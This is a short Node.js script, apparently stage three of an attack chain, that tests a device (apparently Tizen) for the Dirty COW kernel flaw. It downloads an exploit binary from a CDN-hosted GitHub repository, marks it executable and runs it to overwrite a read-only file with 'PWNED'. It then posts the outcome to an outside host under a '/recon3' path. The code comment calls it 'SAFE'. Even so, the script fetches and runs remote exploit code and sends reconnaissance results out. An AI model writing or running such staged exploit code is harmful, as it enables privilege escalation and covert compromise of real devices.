// Stage-3: SAFE Dirty COW probe. Overwrites only a self-owned read-only file.
var fs = require('fs');
var http = require('http');
var https = require('https');
var cp = require('child_process');
var dir = '/home/owner/share/tmp/';
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon3', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v6/dcow.bin', function (r) {
  var c = [];
  r.on('data', function (d) { c.push(d); });
  r.on('end', function () {
    var buf = Buffer.concat(c);
    var out = {};
    if (!buf || buf.length < 1000) { out.err = 'fetch failed'; post(out); return; }
    try {
      fs.writeFileSync(dir + 'dcow', buf);
      fs.chmodSync(dir + 'dcow', parseInt('755', 8));
      fs.writeFileSync(dir + 'probe.txt', 'AAAAAAAAAAAAAAAAAAAA');
      fs.chmodSync(dir + 'probe.txt', parseInt('444', 8));
      out.result = cp.execSync(dir + 'dcow ' + dir + 'probe.txt PWNED', { timeout: 20000 }).toString();
      out.after = fs.readFileSync(dir + 'probe.txt', 'utf8');
    } catch (e) { out.err = e.message; }
    post(out);
  });
}).on('error', function (e) { post({ err: 'https ' + e.message }); });
